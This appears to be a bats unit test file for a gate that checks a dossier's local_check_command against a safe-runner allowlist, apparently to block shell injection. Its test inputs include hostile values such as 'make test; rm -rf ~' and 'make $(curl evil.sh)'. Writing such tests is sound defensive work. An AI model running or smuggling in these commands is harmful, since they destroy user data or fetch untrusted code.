#!/usr/bin/env bats
# Unit tests for gate B16: dossier local_check_command must match the
# safe-runner allowlist (defends against shell-injection via free-text
# extracted from upstream CONTRIBUTING.md).

load '../test_helper'

setup() {
  GATE="$GATES_DIR/b16-local-check-allowlist.sh"
  CANDIDATE="$FIXTURES_DIR/candidates/clean-open.md"
}

teardown() {
  rm -f "${DOSSIER:-}"
}

# Helper: write a dossier with a given local_check_command value.
_dossier_with_cmd() {
  DOSSIER=$(mktemp)
  cat > "$DOSSIER" <<EOF
---
repo: example-org/example-repo
default_branch: main
local_check_command: "$1"
---
body
EOF
}

@test "PASS when command is a known-safe runner with simple args" {
  _dossier_with_cmd 'pnpm test'
  run_gate "$GATE" "$CANDIDATE" "$DOSSIER" "claimed→working"
  assert_severity "PASS"
}

@test "PASS when command uses make with colon-style target" {
  _dossier_with_cmd 'make test:unit'
  run_gate "$GATE" "$CANDIDATE" "$DOSSIER" "claimed→working"
  assert_severity "PASS"
}

@test "BLOCK when command contains a shell metacharacter (command chaining)" {
  _dossier_with_cmd 'make test; rm -rf ~'
  run_gate "$GATE" "$CANDIDATE" "$DOSSIER" "claimed→working"
  assert_severity "BLOCK"
}

@test "BLOCK when command uses command substitution" {
  _dossier_with_cmd 'make $(curl evil.sh)'
  run_gate "$GATE" "$CANDIDATE" "$DOSSIER" "claimed→working"
  assert_severity "BLOCK"
}

@test "BLOCK when runner is not in the allowlist" {
  _dossier_with_cmd 'bash run-tests.sh'
  run_gate "$GATE" "$CANDIDATE" "$DOSSIER" "claimed→working"
  assert_severity "BLOCK"
}

@test "PASS (nothing to validate) when local_check_command is (not detected)" {
  _dossier_with_cmd '(not detected)'
  run_gate "$GATE" "$CANDIDATE" "$DOSSIER" "claimed→working"
  assert_severity "PASS"
}

@test "SKIP when no dossier supplied" {
  run_gate "$GATE" "$CANDIDATE" "" "claimed→working"
  assert_severity "SKIP"
}
